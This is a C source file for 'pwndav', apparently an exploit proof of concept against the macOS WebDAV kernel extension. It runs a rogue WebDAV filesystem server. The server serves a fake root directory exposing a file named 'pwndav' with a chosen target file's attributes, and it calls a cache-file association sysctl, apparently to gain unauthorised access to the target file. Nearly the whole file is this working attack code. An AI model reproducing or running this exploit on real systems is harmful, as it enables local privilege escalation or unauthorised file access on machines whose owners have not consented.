//
//  main.c
//  pwndav
//
//  Created by Chakra on 27/01/20.
//  Copyright © 2020 Sreejith Krishnan R. All rights reserved.
//

#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <strings.h>
#include <limits.h>
#include <unistd.h>
#include <paths.h>
#include <fcntl.h>

#include <sys/sysctl.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/errno.h>
#include <sys/un.h>

#include "webdav_common.h"

#define ROOT_ID CreateOpaqueID(1, 1)
#define TARGET_NAME "pwndav"
#define TARGET_ID CreateOpaqueID(1, 2)
#define TARGET_INO WEBDAV_ROOTFILEID + 1

struct handler_ctx {
  char source[PATH_MAX];
  char destination[PATH_MAX];
  
  int destination_fd;
  int root_fd;
};

int handle_lookup(void *ctx, struct webdav_request_lookup* request, struct webdav_reply_lookup* reply) {
  struct handler_ctx* handler_ctx = (struct handler_ctx*)ctx;
  
  // Root directory
  if (request->dir_id == ROOT_ID) {
    if (strncmp(request->name, TARGET_NAME, MIN(sizeof(TARGET_NAME), request->name_length)) == 0) {
      
      struct stat stat;
      if (fstat(handler_ctx->destination_fd, &stat) != 0) {
        printf("cannot get destination file stat, error %d \n", errno);
        return errno;
      }
      
      reply->obj_id = TARGET_ID;
      reply->obj_fileid = TARGET_INO;
      reply->obj_type = WEBDAV_FILE_TYPE;
      reply->obj_filesize = stat.st_size;
      reply->obj_atime.tv_sec = 1580000000;
      reply->obj_atime.tv_nsec = 0;
      reply->obj_ctime.tv_sec = 1580000000;
      reply->obj_ctime.tv_nsec = 0;
      reply->obj_mtime.tv_sec = 1580000000;
      reply->obj_mtime.tv_nsec = 0;
      reply->obj_createtime.tv_sec = 1580000000;
      reply->obj_createtime.tv_nsec = 0;
     
      return 0;
    }
  }
  
  return 2;
}

int handle_create(void *ctx, struct webdav_request_create *request, struct webdav_reply_create *reply) {
  return EINVAL;
}

int associate_cache_file(int ref, int fd) {
  struct vfsconf conf;
  bzero(&conf, sizeof(conf));
  getvfsbyname("webdav", &conf);
  
  int mib[5];
  
  mib[0] = CTL_VFS;
  mib[1] = conf.vfc_typenum;
  mib[2] = WEBDAV_ASSOCIATECACHEFILE_SYSCTL;
  mib[3] = ref;
  mib[4] = fd;
  
  if (sysctl(mib, 5, NULL, NULL, NULL, 0) != 0) {
    printf("associate cache file sysctl failed, error: %d \n", errno);
    return -1;
  }
  
  return 0;
}

int handle_open(void *ctx, struct webdav_request_open* request, struct webdav_reply_open* reply) {
  struct handler_ctx* handler_ctx = (struct handler_ctx*)ctx;
  
  if (request->obj_id == ROOT_ID) {
    if (associate_cache_file(request->ref, handler_ctx->root_fd) != 0) {
      return errno;
    }
    
    reply->pid = getpid();
    return 0;
  }
  return EINVAL;
}

int handle_close(void *ctx, struct webdav_request_close* request) {
  if (request->obj_id == ROOT_ID) {
    return 0;
  }
  
  return EINVAL;
}

int handle_getattr(void *ctx, struct webdav_request_getattr* request, struct webdav_reply_getattr* reply) {
  struct handler_ctx* handler_ctx = (struct handler_ctx*)ctx;
  
  if (request->obj_id == ROOT_ID) {
    reply->obj_attr.st_dev = 0;
    reply->obj_attr.st_ino = 3;
    reply->obj_attr.st_mode = 16832;
    reply->obj_attr.st_nlink = 1;
    reply->obj_attr.st_uid = 99;
    reply->obj_attr.st_gid = 99;
    reply->obj_attr.st_rdev = 0;
    reply->obj_attr.st_atimespec.tv_sec = 1580139478;
    reply->obj_attr.st_atimespec.tv_nsec = 0;
    reply->obj_attr.st_mtimespec.tv_sec = 1580139478;
    reply->obj_attr.st_mtimespec.tv_nsec = 0;
    reply->obj_attr.st_ctimespec.tv_sec = 1580139478;
    reply->obj_attr.st_ctimespec.tv_nsec = 0;
    reply->obj_attr.st_createtimespec.tv_sec = 0;
    reply->obj_attr.st_createtimespec.tv_nsec = 0;
    reply->obj_attr.st_size = 2048;
    reply->obj_attr.st_blocks = 4;
    reply->obj_attr.st_blksize = 4096;
    reply->obj_attr.st_flags = 0;
    reply->obj_attr.st_gen = 0;
    return 0;
  }
  
  if (request->obj_id == TARGET_ID) {
    struct stat stat;
    if (fstat(handler_ctx->destination_fd, &stat) != 0) {
      printf("cannot get destination file stat, error %d \n", errno);
      return errno;
    }
    
    reply->obj_attr.st_dev = 0;
    reply->obj_attr.st_ino = 4;
    reply->obj_attr.st_mode = stat.st_mode;
    reply->obj_attr.st_nlink = 1;
    reply->obj_attr.st_uid = stat.st_uid;
    reply->obj_attr.st_gid = stat.st_gid;
    reply->obj_attr.st_rdev = 0;
    reply->obj_attr.st_atimespec.tv_sec = stat.st_atimespec.tv_sec;
    reply->obj_attr.st_atimespec.tv_nsec = stat.st_atimespec.tv_nsec;
    reply->obj_attr.st_mtimespec.tv_sec = stat.st_mtimespec.tv_sec;
    reply->obj_attr.st_mtimespec.tv_nsec = stat.st_mtimespec.tv_nsec;
    reply->obj_attr.st_ctimespec.tv_sec = stat.st_ctimespec.tv_sec;
    reply->obj_attr.st_ctimespec.tv_nsec = stat.st_ctimespec.tv_nsec;
    reply->obj_attr.st_createtimespec.tv_sec = stat.st_birthtimespec.tv_sec;
    reply->obj_attr.st_createtimespec.tv_nsec = stat.st_birthtimespec.tv_nsec;
    reply->obj_attr.st_size = stat.st_size;
    reply->obj_attr.st_blocks = stat.st_blocks;
    reply->obj_attr.st_blksize = stat.st_blksize;
    reply->obj_attr.st_flags = stat.st_flags;
    reply->obj_attr.st_gen = 0;
    
    return 0;
  }
  
  return EINVAL;
}

int handle_setattr(void *ctx, struct webdav_request_setattr* request) {
  return EINVAL;
}

int handle_read(void *ctx, struct webdav_request_read* request, char** data, size_t* data_len) {
  return EINVAL;
}

int handle_writeseq(void *ctx, struct webdav_request_writeseq* request, struct webdav_reply_writeseq* reply) {
  return EINVAL;
}

int handle_fsync(void *ctx, struct webdav_request_fsync* request) {
  return EINVAL;
}

int handle_remove(void *ctx, struct webdav_request_remove* request) {
  return EINVAL;
}

int handle_rename(void *ctx, struct webdav_request_rename* request) {
  return EINVAL;
}

int handle_mkdir(void *ctx, struct webdav_request_mkdir* request, struct webdav_reply_mkdir* reply) {
  return EINVAL;
}

int handle_rmdir(void *ctx, struct webdav_request_rmdir* request) {
  return EINVAL;
}

int handle_readdir(void *ctx, struct webdav_request_readdir* request) {
  if (request->obj_id == ROOT_ID) {
    return 0;
  }
  
  return EINVAL;
}

int handle_statfs(void *ctx, struct webdav_request_statfs* request, struct webdav_reply_statfs* reply) {
  return EINVAL;
}

int handle_unmount(void *ctx, struct webdav_request_unmount* request) {
  return 0;
}

int handle_invalcaches(void *ctx, struct webdav_request_invalcaches* request) {
  return EINVAL;
}
  
int handle_dump_cookies(void *ctx, struct webdav_request_cookies* request) {
  return EINVAL;
}

int handle_clear_cookies(void *ctx, struct webdav_request_cookies* request) {
  return EINVAL;
}

int handler(void* ctx, int socket) {
  struct webdav_kext_handler router = {
    .ctx = ctx,
    .handle_lookup = handle_lookup,
    .handle_create = handle_create,
    .handle_open = handle_open,
    .handle_close = handle_close,
    .handle_getattr = handle_getattr,
    .handle_setattr = handle_setattr,
    .handle_read = handle_read,
    .handle_write_seq = handle_writeseq,
    .handle_fsync = handle_fsync,
    .handle_remove = handle_remove,
    .handle_rename = handle_rename,
    .handle_mkdir = handle_mkdir,
    .handle_rmdir = handle_rmdir,
    .handle_readdir = handle_readdir,
    .handle_statfs = handle_statfs,
    .handle_unmount = handle_unmount,
    .handle_invalcaches = handle_invalcaches,
    .handle_dump_cookies = handle_dump_cookies,
    .handle_clear_cookies = handle_clear_cookies,
  };
  
  return webdav_kext_handle(&router, socket);
}

int setup_root_fd(int fd) {
  struct webdav_dirent dirent[3];
  bzero(&dirent, sizeof(dirent));
  
  dirent[0].d_ino = WEBDAV_ROOTFILEID;
  dirent[0].d_name[0] = '.';
  dirent[0].d_namlen = 1;
  dirent[0].d_type = DT_DIR;
  dirent[0].d_reclen = sizeof(struct webdav_dirent);
  
  dirent[1].d_ino = WEBDAV_ROOTPARENTFILEID;
  dirent[1].d_name[0] = '.';
  dirent[1].d_name[1] = '.';
  dirent[1].d_namlen = 2;
  dirent[1].d_type = DT_DIR;
  dirent[1].d_reclen = sizeof(struct webdav_dirent);
  
  dirent[2].d_ino = TARGET_INO;
  strncpy(dirent[2].d_name, TARGET_NAME, sizeof(dirent[2].d_name));
  dirent[2].d_namlen = strnlen(TARGET_NAME, sizeof(TARGET_NAME));
  dirent[2].d_type = DT_REG;
  dirent[2].d_reclen = sizeof(struct webdav_dirent);
  
  if (sizeof(dirent) != write(fd, &dirent, sizeof(dirent))) {
    return -1;
  }
  
  return 0;
}

int main(int argc, char** argv) {
  if (argc != 3) {
    printf("Usage = pwndav <path to source> <path to target> \n");
    return EINVAL;
  }
  
  struct handler_ctx handler_ctx;
  bzero(&handler_ctx, sizeof(handler_ctx));
  
  strlcpy(handler_ctx.source, argv[1], sizeof(handler_ctx.source));
  strlcpy(handler_ctx.destination, argv[2], sizeof(handler_ctx.destination));
  handler_ctx.destination_fd = open(handler_ctx.destination, O_RDONLY);
  if (handler_ctx.destination_fd < 0) {
    printf("cannot open destination as readonly, error %d \n", errno);
    return errno;
  }
  
  strlcpy(handler_ctx.destination, argv[2], sizeof(handler_ctx.destination));
  
  struct sockaddr_un un;
  bzero(&un, sizeof(un));
  
  char id[NAME_MAX] = "pwndav.XXXXXX";
  if (mktemp(id) == NULL) {
    printf("cannot create id, error = %d \n", errno);
    return errno;
  }
  
  snprintf(un.sun_path, sizeof(un.sun_path), "%s.uds.%s", _PATH_TMP, id);
  un.sun_len = sizeof(un);
  un.sun_family = PF_LOCAL;
  
  char mnt_name[NAME_MAX];
  bzero(mnt_name, sizeof(mnt_name));
  snprintf(mnt_name, sizeof(mnt_name), "mount.%s", id);
  
  char vol_name[NAME_MAX];
  bzero(vol_name, sizeof(vol_name));
  snprintf(vol_name, sizeof(vol_name), "vol.%s", id);
  
  char mnt_dir[PATH_MAX];
  bzero(mnt_dir, sizeof(mnt_dir));
  snprintf(mnt_dir, sizeof(mnt_dir), "%s.mnt.%s", _PATH_TMP, id);
  
  char root_cache_path[PATH_MAX];
  bzero(root_cache_path, sizeof(root_cache_path));
  snprintf(root_cache_path, sizeof(root_cache_path), "%s.root.cache.%s", _PATH_TMP, id);
  handler_ctx.root_fd = open(root_cache_path, O_CREAT | O_RDWR);
  if (handler_ctx.root_fd < 0) {
    printf("cannot create root cache, error: %d \n", errno);
    return errno;
  }
  
  if (setup_root_fd(handler_ctx.root_fd) != 0) {
    printf("cannot setup root cache, error: %d \n", errno);
    return errno;
  }
  
  if (mkdir(mnt_dir, 0700) != 0) {
    printf("cannot create mount directory %s, error = %d \n", mnt_dir, errno);
    return errno;
  }
  
  printf("staring pwndav %s \n", id);
  
  int result = webdav_mount_and_listen(handler, &handler_ctx, &un, mnt_name, vol_name, mnt_dir);
  
  if (remove(un.sun_path) != 0) {
    printf("cannot remove temporary uds socket file %s, error = %d \n", un.sun_path, errno);
  }
  
  if (remove(mnt_dir) != 0) {
    printf("cannot remove mount directory %s, error = %d \n", mnt_dir, errno);
  }
  
  return result;
}
